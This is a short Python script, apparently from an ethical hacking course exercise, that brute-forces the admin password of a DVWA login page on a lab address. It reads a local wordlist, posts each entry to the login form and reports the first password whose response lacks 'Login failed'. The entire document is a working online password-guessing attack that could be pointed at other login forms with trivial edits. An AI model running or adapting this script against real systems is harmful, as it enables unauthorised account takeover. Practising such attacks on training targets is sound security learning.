import requests

target_url = "http://10.0.2.16/dvwa/login.php"
data_dict = {"username":"admin", "password":"", "Login":"submit"}

with open("E:\SK\Udemy\Zaid\Learn Python & Ethical Hacking From Scratch\Website hacking - Guess login\passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data = data_dict)
        if "Login failed" not in response.content.decode(errors="ignore"):
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached End of line. ")
